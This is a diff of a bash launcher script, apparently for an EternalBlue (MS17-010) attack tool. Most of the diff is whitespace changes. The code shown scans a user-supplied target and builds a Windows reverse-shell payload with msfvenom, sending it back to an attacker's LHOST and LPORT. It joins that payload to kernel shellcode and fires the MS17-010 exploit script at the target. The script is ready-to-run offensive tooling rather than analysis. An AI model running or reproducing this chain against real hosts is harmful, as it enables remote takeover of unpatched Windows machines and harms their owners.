@@ -52,59 +52,59 @@ declare -r var29="msfvenom not installed"
 
 
 function check(){
-	    echo ""
-	    echo -e "$White$var9$YellowLight$var22$White$var10 $White$var24$End"
-	    sleep 2
-    if [ "$(id -u)" == "0" ]; then
-	    echo ""
-	    echo -e "$White$var9$GreenLight$var11$White$var10 $White$var25$End"
-	    sleep 2
-	    echo ""
-    else
-	    echo ""
-	    echo -e "$White$var9$Red$var23$White$var10 $White$var26$End"
-	    sleep 2
-	    echo ""
+		echo ""
+		echo -e "$White$var9$YellowLight$var22$White$var10 $White$var24$End"
+	    	sleep 2
+	if [ "$(id -u)" == "0" ]; then
+	    	echo ""
+	    	echo -e "$White$var9$GreenLight$var11$White$var10 $White$var25$End"
+	    	sleep 2
+	    	echo ""
+    	else
+	    	echo ""
+	    	echo -e "$White$var9$Red$var23$White$var10 $White$var26$End"
+	    	sleep 2
+	    	echo ""
 		exit 1
-    fi	
+    	fi
 }
 
 function msf(){
 		echo -e "$White$var9$YellowLight$var22$White$var10 $White$var27$End"
 		sleep 2
-	    which msfvenom > /dev/null 2>&1
-    if [ "$(echo $?)" == "0" ]; then
+	    	which msfvenom > /dev/null 2>&1
+    	if [ "$(echo $?)" == "0" ]; then
 		echo ""
-	    echo -e "$White$var9$GreenLight$var11$White$var10 $White$var28$End"
-	    sleep 2
-	    echo ""
+	    	echo -e "$White$var9$GreenLight$var11$White$var10 $White$var28$End"
+	    	sleep 2
+	    	echo ""
 		clear
-    else
-        echo ""
-	    echo -e "$White$var9$Red$var23$White$var10 $White$var29$End"
-	    sleep 2
-	    echo ""
-	    exit 1
-    fi
+	else
+        	echo ""
+	    	echo -e "$White$var9$Red$var23$White$var10 $White$var29$End"
+	    	sleep 2
+	    	echo ""
+	    	exit 1
+    	fi
 }
 
 function banner(){
 	echo ""
-    echo -e "$BlueLight┌═══════════════════════════════════┐$End"
-    echo -e "$BlueLight║$Blue  ██╗    ██╗██╗███╗   ██╗███████╗  $BlueLight║$End"
-    echo -e "$BlueLight║$Blue  ██║    ██║██║████╗  ██║╚════██║  $BlueLight║$End" 
-    echo -e "$BlueLight║$Blue  ██║ █╗ ██║██║██╔██╗ ██║    ██╔╝  $BlueLight║$End" 
-    echo -e "$BlueLight║$Blue  ██║███╗██║██║██║╚██╗██║   ██╔╝   $BlueLight║$End"  
-    echo -e "$BlueLight║$Blue  ╚███╔███╔╝██║██║ ╚████║   ██║    $BlueLight║$End"
-    echo -e "$BlueLight║$Blue   ╚══╝╚══╝ ╚═╝╚═╝  ╚═══╝   ╚═╝    $BlueLight║$End"   
-    echo -e "$BlueLight║$Blue ██████╗ ██╗     ██╗   ██╗███████╗ $BlueLight║$End"
-    echo -e "$BlueLight║$Blue ██╔══██╗██║     ██║   ██║██╔════╝ $BlueLight║$End"
-    echo -e "$BlueLight║$Blue ██████╔╝██║     ██║   ██║█████╗   $BlueLight║$End"  
-    echo -e "$BlueLight║$Blue ██╔══██╗██║     ██║   ██║██╔══╝   $BlueLight║$End" 
-    echo -e "$BlueLight║$Blue ██████╔╝███████╗╚██████╔╝███████╗ $BlueLight║$End"
-    echo -e "$BlueLight║$Blue ╚═════╝ ╚══════╝ ╚═════╝ ╚══════╝ $BlueLight║$End"
+    	echo -e "$BlueLight┌═══════════════════════════════════┐$End"
+    	echo -e "$BlueLight║$Blue  ██╗    ██╗██╗███╗   ██╗███████╗  $BlueLight║$End"
+    	echo -e "$BlueLight║$Blue  ██║    ██║██║████╗  ██║╚════██║  $BlueLight║$End" 
+    	echo -e "$BlueLight║$Blue  ██║ █╗ ██║██║██╔██╗ ██║    ██╔╝  $BlueLight║$End" 
+    	echo -e "$BlueLight║$Blue  ██║███╗██║██║██║╚██╗██║   ██╔╝   $BlueLight║$End"  
+    	echo -e "$BlueLight║$Blue  ╚███╔███╔╝██║██║ ╚████║   ██║    $BlueLight║$End"
+    	echo -e "$BlueLight║$Blue   ╚══╝╚══╝ ╚═╝╚═╝  ╚═══╝   ╚═╝    $BlueLight║$End"   
+    	echo -e "$BlueLight║$Blue ██████╗ ██╗     ██╗   ██╗███████╗ $BlueLight║$End"
+    	echo -e "$BlueLight║$Blue ██╔══██╗██║     ██║   ██║██╔════╝ $BlueLight║$End"
+    	echo -e "$BlueLight║$Blue ██████╔╝██║     ██║   ██║█████╗   $BlueLight║$End"  
+    	echo -e "$BlueLight║$Blue ██╔══██╗██║     ██║   ██║██╔══╝   $BlueLight║$End" 
+    	echo -e "$BlueLight║$Blue ██████╔╝███████╗╚██████╔╝███████╗ $BlueLight║$End"
+    	echo -e "$BlueLight║$Blue ╚═════╝ ╚══════╝ ╚═════╝ ╚══════╝ $BlueLight║$End"
 	echo -e "$BlueLight║$White $var9$Blue$var11$White$var10  $Green$var20 $White$var12 $Green$var21  $White$var9$Blue$var11$White$var10 $BlueLight║$End"
-    echo -e "$BlueLight└═══════════════════════════════════┘$End"
+	echo -e "$BlueLight└═══════════════════════════════════┘$End"
 }
 
 function main(){
@@ -120,70 +120,70 @@ function menu(){
 
 read -p " $(echo -e $Blue$shell $End)" opc
 
-    if [ $opc -eq 1 ]; then
-   	   	echo ""
-	   	echo -e "$White$var14$Blue$var16$White$var15$End"
-	   	echo ""
-	   	read rhost
-	   	echo ""
-    	python eternalblue_scanner.py $rhost
-    	echo ""
+	if [ $opc -eq 1 ]; then
+		echo ""
+		echo -e "$White$var14$Blue$var16$White$var15$End"
+		echo ""
+		read rhost
+		echo ""
+    		python eternalblue_scanner.py $rhost
+    		echo ""
 		exit 0
-    elif [ $opc -eq 2 ]; then
-	   	echo ""
-	   	echo -e "$White$var14$Blue$var16$White$var15$End"
-	   	echo ""
-	   	read rhost
-	   	echo ""
-	   	echo -e "$White$var14$Blue$var17$White$var15$End"
-	   	echo ""
-	   	read lhost
-	   	echo ""
-	   	echo -e "$White$var14$Blue$var18$White$var15$End"
-	   	echo ""
-	   	read lport
-	   	echo ""
-	   	rm -rf sc_x86_msf.bin
-	   	rm -rf sc_x86.bin
-	   	echo -e "$Blue$var19$End"
-	   	echo ""
-	   	sleep 2
-	    msfvenom -p windows/shell_reverse_tcp -f raw -o sc_x86_msf.bin EXITFUNC=thread LHOST=$lhost LPORT=$lport 2>/dev/null
-	    sleep 1
-        cat sc_x86_kernel.bin sc_x86_msf.bin > sc_x86.bin
-        sleep 1
-        python3 ms17_010_eternalblue.py $rhost sc_x86.bin
+	elif [ $opc -eq 2 ]; then
+		echo ""
+		echo -e "$White$var14$Blue$var16$White$var15$End"
+		echo ""
+		read rhost
+		echo ""
+		echo -e "$White$var14$Blue$var17$White$var15$End"
+		echo ""
+		read lhost
+		echo ""
+		echo -e "$White$var14$Blue$var18$White$var15$End"
+		echo ""
+		read lport
+		echo ""
+		rm -rf sc_x86_msf.bin
+		rm -rf sc_x86.bin
+		echo -e "$Blue$var19$End"
+		echo ""
+		sleep 2
+		msfvenom -p windows/shell_reverse_tcp -f raw -o sc_x86_msf.bin EXITFUNC=thread LHOST=$lhost LPORT=$lport 2>/dev/null
+		sleep 1
+        	cat sc_x86_kernel.bin sc_x86_msf.bin > sc_x86.bin
+        	sleep 1
+        	python3 ms17_010_eternalblue.py $rhost sc_x86.bin
 	   	exit
-    elif [ $opc -eq 3 ]; then
-        echo ""
-	   	echo -e "$White$var14$Blue$var16$White$var15$End"
-	   	echo ""
-	   	read rhost
-	   	echo ""
-	   	echo -e "$White$var14$Blue$var17$White$var15$End"
-	   	echo ""
-	   	read lhost
-	   	echo ""
-	   	echo -e "$White$var14$Blue$var18$White$var15$End"
-	   	echo ""
-	   	read lport
-	   	echo ""
-	   	rm -rf sc_x64_msf.bin
-	   	rm -rf sc_x64.bin
-	   	echo -e "$Blue$var19$End"
-	   	echo ""
-	   	sleep 2
-	   	msfvenom -p windows/x64/shell_reverse_tcp -f raw -o sc_x64_msf.bin EXITFUNC=thread LHOST=$lhost LPORT=$lport 2>/dev/null
-	   	sleep 1
-        cat sc_x64_kernel.bin sc_x64_msf.bin > sc_x64.bin
-        sleep 1
-        python3 ms17_010_eternalblue.py $rhost sc_x64.bin
-    elif [ $opc -eq 4 ]; then
+	elif [ $opc -eq 3 ]; then
+        	echo ""
+		echo -e "$White$var14$Blue$var16$White$var15$End"
+		echo ""
+		read rhost
+		echo ""
+		echo -e "$White$var14$Blue$var17$White$var15$End"
+		echo ""
+		read lhost
+		echo ""
+		echo -e "$White$var14$Blue$var18$White$var15$End"
+		echo ""
+		read lport
+		echo ""
+		rm -rf sc_x64_msf.bin
+		rm -rf sc_x64.bin
+		echo -e "$Blue$var19$End"
+		echo ""
+		sleep 2
+		msfvenom -p windows/x64/shell_reverse_tcp -f raw -o sc_x64_msf.bin EXITFUNC=thread LHOST=$lhost LPORT=$lport 2>/dev/null
+		sleep 1
+        	cat sc_x64_kernel.bin sc_x64_msf.bin > sc_x64.bin
+        	sleep 1
+        	python3 ms17_010_eternalblue.py $rhost sc_x64.bin
+	elif [ $opc -eq 4 ]; then
 		echo ""
 		exit 0
-    else
+	else
 		:
-    fi
+    	fi
 }
 
 function start(){
